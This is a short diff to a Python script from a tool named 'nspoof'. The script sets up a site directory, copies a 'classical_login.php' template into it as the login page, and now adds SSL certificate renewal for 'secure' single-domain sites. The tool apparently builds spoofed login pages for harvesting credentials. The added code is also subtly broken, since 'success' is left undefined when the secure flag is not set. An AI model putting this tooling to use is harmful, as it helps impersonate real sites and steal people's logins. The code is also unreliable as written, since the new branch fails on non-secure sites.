@@ -7,6 +7,7 @@ sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
 from environment import *
 sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'utils')))
 from renew_config_file import renew_config_file
+from renew_ssl_certs import renew_ssl_certs
 
 #
 # Function for creating file.
@@ -89,6 +90,17 @@ def add_site_command(params):
 	subprocess.run(['cp', ENV['nspoof_location'] + "/login_script_templates/classical_login.php", newdir + "/login.php"])
 
 	new_site = [idd, domains, 0, 1, [], newdir, int(params[-1])]
+
+	if int(params[-1]) == 1:
+
+		if len(domains) != 1:
+			print("Error : You have to specify just one domain to generate a secure website.")
+			return;
+
+		success = renew_ssl_certs(domains[0])
+
+	if not success:
+		return
 
 	renew_config_file(domains, idd, int(params[-1]))
 
